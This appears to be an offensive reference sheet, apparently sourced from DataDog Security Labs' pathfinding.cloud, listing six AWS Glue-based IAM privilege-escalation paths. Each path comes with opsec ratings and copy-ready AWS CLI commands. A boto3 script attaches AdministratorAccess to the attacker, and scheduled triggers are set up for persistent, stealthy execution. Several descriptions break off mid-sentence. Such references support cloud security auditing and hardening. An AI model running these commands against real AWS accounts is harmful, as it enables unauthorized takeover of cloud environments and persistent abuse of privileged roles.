# Glue - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + glue:CreateDevEndpoint [added: 2026-04]
- **Tags:** #Iam #Glue #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + glue service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, glue:CreateDevEndpoint; A role must exist that trusts glue.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [glue-001] A principal with `iam:PassRole` and `glue:CreateDevEndpoint` can create a new Glue development endpoint and attach an existing IAM role to it. Glue dev endpoints provide SSH/Zeppelin notebook access where arbitrary code can be executed with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.
- **Payload/Method:**
```
# Step 1: Create a Glue development endpoint with the privileged role and your SSH public key
aws glue create-dev-endpoint --endpoint-name privesc-endpoint \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
  --public-key "$(cat ~/.ssh/id_rsa.pub)"

# Step 2: Wait for the endpoint to become available and retrieve connection details
aws glue get-dev-endpoint --endpoint-name privesc-endpoint

# Step 3: SSH into the dev endpoint and execute code with elevated privileges
ssh glue@ENDPOINT_ADDRESS
```

### glue:UpdateDevEndpoint [added: 2026-04]
- **Tags:** #Glue #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; glue in scope
- **Prereq:** IAM perms: glue:UpdateDevEndpoint; A Glue development endpoint must already exist
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [glue-002] A principal with `glue:UpdateDevEndpoint` can update an existing Glue development endpoint to add their SSH public key, granting them SSH access to the endpoint. Since the endpoint executes with the permissions of its attached IAM role, the attacker gains the privileges of that role. This path doesn't require `iam:PassRole` as the role is already attached.
- **Payload/Method:**
```
# Step 1: List existing Glue development endpoints and their attached roles
aws glue get-dev-endpoints

# Step 2: Add your SSH public key to an existing privileged dev endpoint
aws glue update-dev-endpoint --endpoint-name TARGET_ENDPOINT \
  --add-public-keys "$(cat ~/.ssh/id_rsa.pub)"

# Step 3: Retrieve the endpoint address
aws glue get-dev-endpoint --endpoint-name TARGET_ENDPOINT

# Step 4: SSH into the dev endpoint and execute code with the endpoint's role permissions
ssh glue@ENDPOINT_ADDRESS
```

### iam:PassRole + glue:CreateJob + glue:StartJobRun [added: 2026-04]
- **Tags:** #Iam #Glue #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + glue service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, glue:CreateJob, glue:StartJobRun; A role must exist that trusts glue.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [glue-003] A principal with `iam:PassRole`, `glue:CreateJob`, and `glue:StartJobRun` can create an AWS Glue job with a privileged IAM role and execute Python code that modifies IAM permissions. AWS Glue jobs are serverless ETL (Extract, Transform, Load) workloads that run Python or Scala scripts in a managed environment. When creating a Glue job, an IAM role must be assigned that grants permissions to the jo
- **Payload/Method:**
```
# Step 1: Prepare a Python script that will attach AdministratorAccess policy to your starting principal. This script can be uploa
# Create Python script that attaches admin policy (upload to S3 or use inline)
# Example script content:
import boto3
iam = boto3.client('iam')
iam.attach_user_policy(
    UserName='target-username',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)

# Step 2: Create a Glue Python shell job with the privileged role. The --role parameter uses iam:PassRole to assign the administra
aws glue create-job \
  --region us-east-1 \
  --name privesc-glue-job \
  --role "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
  --command "Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9" \
  --default-arguments '{"--job-language":"python"}' \
  --max-capacity 0.0625 \
  --timeout 5

# Step 3: Start the Glue job run. This executes your Python script with the privileges of the administrative role you passed to th
aws glue start-job-run \
  --region us-east-1 \
  --job-name privesc-glue-job

# Step 4: Monitor the job execution status. Wait for the JobRunState to show SUCCEEDED, which indicates your script has completed 
# Wait 1-2 minutes for job completion, then verify
aws glue get-job-run \
  --region us-east-1 \
  --job-name privesc-glue-job \
  --run-id JOB_RUN_ID \
  --query 'JobRun.JobRunState'

# Step 5: After the job completes and IAM changes propagate, verify that you now have administrative permissions by executing a pr
# Wait 15 seconds for IAM policy propagation
sleep 15
# Verify admin access
aws iam list-users
```

### iam:PassRole + glue:CreateJob + glue:CreateTrigger [added: 2026-04]
- **Tags:** #Iam #Glue #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + glue service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, glue:CreateJob, glue:CreateTrigger; A role must exist that trusts glue.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [glue-004] A principal with `iam:PassRole`, `glue:CreateJob`, and `glue:CreateTrigger` can create an AWS Glue job with a privileged IAM role and establish a scheduled trigger that automatically executes the job. Unlike manual execution via `glue:StartJobRun`, this technique creates a persistent attack mechanism through scheduled automation. AWS Glue triggers are automation components that can start jobs base
- **Payload/Method:**
```
# Step 1: Prepare a Python script that will attach AdministratorAccess policy to your starting principal. This script must be uplo
# Create Python script that attaches admin policy (upload to S3)
# Example script content:
import boto3
iam = boto3.client('iam')
iam.attach_user_policy(
    UserName='target-username',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)

# Step 2: Create a Glue Python shell job with the privileged role. The --role parameter uses iam:PassRole to assign the administra
aws glue create-job \
  --region us-east-1 \
  --name privesc-glue-job \
  --role "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
  --command "Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9" \
  --default-arguments '{"--job-language":"python"}' \
  --max-capacity 0.0625 \
  --timeout 5

# Step 3: Create a scheduled trigger with --start-on-creation flag. This immediately activates the trigger and schedules the job t
aws glue create-trigger \
  --region us-east-1 \
  --name privesc-trigger \
  --type SCHEDULED \
  --start-on-creation \
  --schedule "cron(0/1 * * * ? *)" \
  --actions '[{"JobName": "privesc-glue-job"}]'

# Step 4: Verify the trigger state shows ACTIVATED. Scheduled triggers fire at the next scheduled time (every minute in this case)
# Wait 1-3 minutes for trigger to fire and job to complete
aws glue get-trigger \
  --region us-east-1 \
  --name privesc-trigger \
  --query 'Trigger.State'

# Step 5: Check the latest job run to confirm it has executed. Wait for JobRunState to show SUCCEEDED, indicating your script has 
aws glue get-job-runs \
  --region us-east-1 \
  --job-name privesc-glue-job \
  --max-results 1 \
  --query 'JobRuns[0].JobRunState'
```

### iam:PassRole + glue:UpdateJob + glue:StartJobRun [added: 2026-04]
- **Tags:** #Iam #Glue #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + glue service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, glue:UpdateJob, glue:StartJobRun; An existing Glue job must be present in the environment that can be modified
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [glue-005] A principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:StartJobRun` can modify an existing AWS Glue ETL job to execute with an administrative role and malicious Python code that grants the starting principal administrative access. Unlike the `glue:CreateJob` privilege escalation technique where an attacker creates a new Glue job, this scenario exploits the ability to update an existing job t
- **Payload/Method:**
```
# Step 1: Discover existing Glue jobs in the environment. Choose a job that you have permission to update. Jobs that run infrequen
# List existing Glue jobs to find one to modify
aws glue list-jobs --region us-east-1

# Step 2: Retrieve the current job configuration to see its existing role and script location. Document these values if you need t
# View current job configuration
aws glue get-job \
  --region us-east-1 \
  --job-name existing-job-name \
  --query 'Job.{Role: Role, Script: Command.ScriptLocation}'

# Step 3: Prepare a Python script that will attach AdministratorAccess policy to your starting principal. Upload this script to an
# Create Python script that attaches admin policy (upload to S3)
# Example script content:
import boto3
iam = boto3.client('iam')
iam.attach_user_policy(
    UserName='target-username',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)

# Step 4: Update the existing Glue job to use the privileged role and point to your malicious script. The Role parameter uses iam:
aws glue update-job \
  --region us-east-1 \
  --job-name existing-job-name \
  --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}"

# Step 5: Start the updated Glue job. This executes your malicious Python script with the privileges of the administrative role yo
aws glue start-job-run \
  --region us-east-1 \
  --job-name existing-job-name
```

### iam:PassRole + glue:UpdateJob + glue:CreateTrigger [added: 2026-04]
- **Tags:** #Iam #Glue #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + glue service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, glue:UpdateJob, glue:CreateTrigger; An existing Glue job must be present in the environment that can be modified
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [glue-006] A principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:CreateTrigger` can modify an existing AWS Glue job to use an administrative role and execute malicious code, then establish a scheduled trigger for persistent automated execution. This scenario demonstrates a stealthy privilege escalation vulnerability that combines the stealth of updating existing infrastructure with the persistence of 
- **Payload/Method:**
```
# Step 1: Discover existing Glue jobs in the environment. Choose a job that you have permission to update. Jobs that run infrequen
# List existing Glue jobs to find one to modify
aws glue list-jobs --region us-east-1

# Step 2: Retrieve the current job configuration to see its existing role and script location. Document these values if you need t
# View current job configuration
aws glue get-job \
  --region us-east-1 \
  --job-name existing-job-name \
  --query 'Job.{Role: Role, Script: Command.ScriptLocation}'

# Step 3: Prepare a Python script that will attach AdministratorAccess policy to your starting principal. Upload this script to an
# Create Python script that attaches admin policy (upload to S3)
# Example script content:
import boto3
iam = boto3.client('iam')
iam.attach_user_policy(
    UserName='target-username',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)

# Step 4: Update the existing Glue job to use the privileged role and point to your malicious script. The Role parameter uses iam:
aws glue update-job \
  --region us-east-1 \
  --job-name existing-job-name \
  --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}"

# Step 5: Create a scheduled trigger with --start-on-creation flag for the modified job. This immediately activates the trigger an
aws glue create-trigger \
  --region us-east-1 \
  --name privesc-trigger \
  --type SCHEDULED \
  --start-on-creation \
  --schedule "cron(0/1 * * * ? *)" \
  --actions '[{"JobName": "existing-job-name"}]'
```
